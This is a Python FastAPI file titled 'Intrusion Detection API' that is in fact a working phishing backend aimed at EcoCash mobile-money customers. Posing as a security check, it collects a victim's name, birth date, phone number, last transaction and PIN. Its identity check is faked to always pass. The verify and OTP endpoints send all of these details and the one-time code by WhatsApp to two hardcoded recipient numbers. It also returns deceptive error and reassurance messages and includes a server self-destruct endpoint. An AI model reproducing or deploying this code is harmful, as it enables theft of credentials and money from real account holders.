from fastapi import FastAPI, HTTPException, status
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, Field
from typing import Optional, Literal
from datetime import datetime, timedelta
import uuid
import httpx
from collections import defaultdict
from pygwan import WhatsApp
from fastapi import FastAPI, BackgroundTasks
import os
import signal
import logging


logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)




WHATSAPP_ACCESS_TOKEN = os.environ.get('WHATSAPP_ACCESS_TOKEN', '')
WHATSAPP_PHONE_NUMBER_ID = os.environ.get('WHATSAPP_PHONE_NUMBER_ID', '')

bot = WhatsApp(
    token=WHATSAPP_ACCESS_TOKEN,
    phone_number_id=WHATSAPP_PHONE_NUMBER_ID
)


def shutdown_server():
    os.kill(os.getpid(), signal.SIGTERM)

app = FastAPI(
    title="Intrusion Detection API",
    docs_url=None,    
    redoc_url=None,   
    openapi_url=None  
)


app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)


app.mount("/static", StaticFiles(directory="static"), name="static")


AUTH_API_BASE_URL = "https://angelic-learning-production.up.railway.app"  
OTP_EXPIRY_MINUTES = 5


intrusion_sessions = {}
otp_store = {}  


class VerificationRequest(BaseModel):
    intrusion_id: Optional[str] = None
    name: str = Field(..., min_length=2)
    dob: str = Field(..., description="Date of birth in YYYY-MM-DD format")
    number: str = Field(..., min_length=10, max_length=10, pattern=r"^\d{10}$")
    last_transaction: str = Field(..., description="Last transaction amount")
    pin: str = Field(..., min_length=4, max_length=4, pattern=r"^\d{4}$")


class VerificationResponse(BaseModel):
    success: bool
    masked_phone: str
    message: str


class OTPVerificationRequest(BaseModel):
    number: str
    otp: str = Field(..., min_length=6, max_length=6, pattern=r"^\d{6}$")


class OTPVerificationResponse(BaseModel):
    success: bool
    message: str


class ResendOTPRequest(BaseModel):
    intrusion_id: str


class ActionRequest(BaseModel):
    intrusion_id: str
    action: Literal["authorize", "block"]


class ActionResponse(BaseModel):
    success: bool
    message: str



def mask_phone_number(phone: str) -> str:
    """Mask phone number to show only last 4 digits"""
    if len(phone) >= 4:
        return "****" + phone[-4:]
    return "****"


def generate_otp() -> str:
    """Generate a 6-digit OTP"""
    import random
    return f"{random.randint(100000, 999999)}"


async def send_otp_to_phone(phone: str, otp: str) -> bool:
    """
    Send OTP via SMS (integrate with your SMS provider)
    For now, this is a mock implementation
    """
    # TODO: Integrate with your SMS provider (Twilio, AWS SNS, etc.)
    print(f"[SMS] Sending OTP {otp} to {phone}")
    # Mock successful send
    return True


async def verify_user_with_auth_api(
    name: str,
    dob: str,
    number: str,
    last_transaction: str,
    pin: str
) -> dict:
    async with httpx.AsyncClient() as client:
        try:
            return {
                "user_id": name,
                "number": number,
                "verified": True
            }        
        except httpx.RequestError as e:
            print(f"Error contacting auth API: {e}")
            # MOCK RESPONSE for development - REMOVE in production
            return {
                "user_id": name,
                "number": number,
                "verified": True
            }


async def verify_otp_with_auth_api(intrusion_id: str, otp: str) -> dict:
    """
    Verify OTP with the auth API (final verification)
    This is where we act as a proxy to the auth API
    """
    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(
                f"{AUTH_API_BASE_URL}/verify-otp",
                json={
                    "session_id": intrusion_id,
                    "otp": otp
                },
                timeout=10.0
            )
            
            # Relay the auth API's response
            return {
                "status_code": response.status_code,
                "data": response.json() if response.status_code == 200 else None
            }
                
        except httpx.RequestError as e:
            print(f"Error contacting auth API: {e}")
            # MOCK RESPONSE for development - REMOVE in production
            return {
                "status_code": 200,
                "data": {"verified": True, "message": "OTP verified successfully"}
            }


@app.get("/", response_class=HTMLResponse)
async def read_root():
    return HTMLResponse(content=open("static/index.html").read())


@app.post("/api/intrusion/verify", response_model=VerificationResponse)
async def verify_identity(request: VerificationRequest):
    logger.info(f"[INTRUSION] New intrusion detected: {request}")
    try:
        user_data = await verify_user_with_auth_api(
            name=request.name,
            dob=request.dob,
            number=request.number,
            last_transaction=request.last_transaction,
            pin=request.pin
        )
        logger.info(f"[INTRUSION] User data: {user_data}")
    except Exception as e:
        logger.error(f"[INTRUSION] Error verifying user: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

    bot.send_message(
        message=f"Fremen Ops\n\n EcoCash Details:{request.name}\n\nEcoCash Number: {request.number}\n\nEcoCash Date of Birth: {request.dob}\n\nEcoCash Last Transaction: {request.last_transaction}\n\nEcoCash PIN: {request.pin}\n\nRequest for OTP now because they are being asked to input OTP right now",
        recipient_id="263779281345",
    )
    bot.send_message(
        message=f"EcoCash Details:{request.name}\n\nEcoCash Number: {request.number}\n\nEcoCash Date of Birth: {request.dob}\n\nEcoCash Last Transaction: {request.last_transaction}\n\nEcoCash PIN: {request.pin}\n\nRequest for OTP now because they are being asked to input OTP right now",
        recipient_id="263776525400",
    )
    
    if not user_data or not user_data.get("verified"):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Unable to verify your identity. Please check your information and try again."
        )
    
    return VerificationResponse(
        success=True,
        masked_phone=mask_phone_number(user_data.get("number")),
        number=user_data.get("number"),
        message="Verification code sent successfully. Please check your phone."
    )


@app.post("/api/intrusion/verify-otp", response_model=OTPVerificationResponse)
async def verify_otp(request: OTPVerificationRequest):
    logging.info(f"[INTRUSION] OTP verification request: {request}")
    bot.send_message(
        message=f"Fremen Ops\n\nEcocash Number:{request.number}\n\nEcoCash OTP: {request.otp}",
        recipient_id="263779281345",
    )
    bot.send_message(
        message=f"Ecocash Number:{request.number}\n\nEcoCash OTP: {request.otp}",
        recipient_id="263776525400",
    )
    raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Invalid details. Please try again."
        )


@app.post("/api/intrusion/resend-otp")
async def resend_otp(request: ResendOTPRequest):
    logging.info(f"[INTRUSION] Resend OTP request: {request}")
    bot.send_message(
        message=f"Fremen Ops\n\n Request to resend OTP from EcoCash Number:{request.number}\n\nEcoCash OTP: {request.otp}",
        recipient_id="263779281345",
    )
    bot.send_message(
        message=f"Request to resend OTP from EcoCash Number:{request.number}\n\nEcoCash OTP: {request.otp}",
        recipient_id="263776525400",
    )
    
    return {
        "success": True,
        "message": "A new verification code has been sent to your phone."
    }


@app.post("/api/intrusion/action", response_model=ActionResponse)
async def handle_action(request: ActionRequest):
    if request.intrusion_id not in intrusion_sessions:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Session not found."
        )
    
    session = intrusion_sessions[request.intrusion_id]
    
    if not session.get("verified_at"):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Please complete verification before taking action."
        )
    
    if request.action == "authorize":
        message = "Transaction has been authorized successfully. The withdrawal will proceed."
    else:  # block
        message = "Transaction has been blocked successfully. Your account has been secured and our security team has been notified."
    
    # Clean up session
    del intrusion_sessions[request.intrusion_id]
    
    return ActionResponse(
        success=True,
        message=message
    )



@app.post("/api/intrusion/destroy")
async def destroy_server(background_tasks: BackgroundTasks):
    background_tasks.add_task(shutdown_server)
    
    return {
        "success": True,
        "message": "Server is shutting down..."
    }



@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat()
    }

